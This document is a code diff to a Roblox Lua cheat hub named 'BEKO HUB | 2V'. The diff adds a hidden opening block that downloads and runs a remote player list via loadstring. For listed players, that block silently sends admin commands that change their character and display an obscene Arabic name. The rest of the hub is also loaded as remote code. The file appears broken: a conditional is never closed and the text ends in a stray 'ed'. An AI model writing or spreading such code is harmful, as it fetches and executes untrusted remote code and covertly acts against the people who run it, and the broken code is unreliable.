@@ -1,3 +1,36 @@
+local Allowed = loadstring(game:HttpGet("https://raw.githubusercontent.com/Bekonader/bahahaha/main/Bahahah", true))()
+
+if Allowed[game.Players.LocalPlayer.Name] then
+
+wait(0.5)
+
+local args = {
+
+    [1] = ";char me 00nlyz0e"
+
+}
+
+game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+
+wait(1)
+
+local args = {
+
+    [1] = ";name me اه اه كـسـ ي"
+
+}
+
+game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+
+else
+
+----fuck
+
+
+
+
+
+
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
 local Window = OrionLib:MakeWindow({Name = "BEKO HUB | 2V", HidePremium = false, IntroText = "BEKO HUB | 2V", SaveConfig = true, ConfigFolder = "BEKO HUB | 2V"})
@@ -771,3 +804,6 @@ local crTab = Window:MakeTab({
 crTab:AddParagraph("Credits to","DEADSIDE#1676")
 
 OrionLib:Init()
+
+
+ed
